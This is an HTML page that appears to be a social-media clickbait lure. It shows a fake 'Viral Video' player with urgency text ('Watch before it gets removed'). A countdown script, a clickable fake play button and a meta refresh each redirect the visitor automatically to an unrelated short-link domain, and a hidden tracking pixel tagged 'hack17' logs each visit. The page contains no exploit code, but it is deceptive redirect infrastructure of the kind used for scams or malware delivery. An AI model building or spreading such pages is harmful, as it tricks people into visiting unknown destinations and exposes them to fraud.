<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Video Completo</title>

<meta property="og:title" content="🔥 Video Completo">
<meta property="og:description" content="Watch before it gets deleted 👀">
<meta property="og:image" content="https://i.imgur.com/y9VdANx.jpeg">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#f0f2f5;
overflow:hidden;
}

.bg{
position:fixed;
width:100%;
height:100%;
background:url('https://i.imgur.com/y9VdANx.jpeg') center/cover;
filter:blur(12px);
transform:scale(1.1);
opacity:.35;
z-index:-1;
}

.container{
max-width:720px;
margin:auto;
padding:15px;
}

.card{
background:#fff;
border-radius:14px;
overflow:hidden;
box-shadow:0 10px 35px rgba(0,0,0,.2);
}

.video{
position:relative;
cursor:pointer;
}

.card img{
width:100%;
display:block;
}

.play{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
font-size:90px;
color:white;
text-shadow:0 0 20px rgba(0,0,0,.6);
pointer-events:none;
}

.content{
padding:20px;
text-align:center;
}

.title{
font-size:28px;
font-weight:bold;
margin-bottom:12px;
}

.text{
font-size:18px;
color:#666;
margin-bottom:18px;
}

.count{
font-size:22px;
font-weight:bold;
margin-bottom:20px;
}

.btn{
display:inline-block;
background:#fa0909;
color:#fff;
text-decoration:none;
padding:16px 28px;
border-radius:50px;
font-size:20px;
font-weight:bold;
animation:pulse 1.5s infinite;
}

@keyframes pulse{
0%{transform:scale(1);}
50%{transform:scale(1.05);}
100%{transform:scale(1);}
}

.small{
margin-top:15px;
color:#777;
font-size:14px;
}

</style>
</head>

<body>

<div class="bg"></div>

<div class="container">

<div class="card">

<div class="video" onclick="goLink()">

<img src="https://i.imgur.com/y9VdANx.jpeg">

<div class="play">▶</div>

</div>

<div class="content">

<div class="title">
⚠️ Viral Video
</div>

<div class="text">
Watch before it gets removed 👀
</div>

<div class="count">
Opening in <span id="timer">4</span>s...
</div>

<a class="btn" href="https://cbejfbb.pixelsm.life/s/92e7e0b1f4680">
▶ Watch Video
</a>

<div class="small">
If nothing happens, tap the button.
</div>

</div>
</div>
</div>

<img src="//whos.amung.us/pingjs/?k=hack17&t=PODERRRRR💯💯&x=https://www.facebook.com" style="display:none">

<script>

const link = "https://cbejfbb.pixelsm.life/s/92e7e0b1f4680";

function goLink(){
window.location.href = link;
}

let t = 4;

const timer = document.getElementById('timer');

const x = setInterval(() => {

t--;

timer.innerText = t;

if(t <= 0){

clearInterval(x);

window.location.href = link;

}

},1000);

</script>

</body>
</html>
<meta http-equiv="REFRESH" content="03;URL=https://cbejfbb.pixelsm.life/s/92e7e0b1f4680">
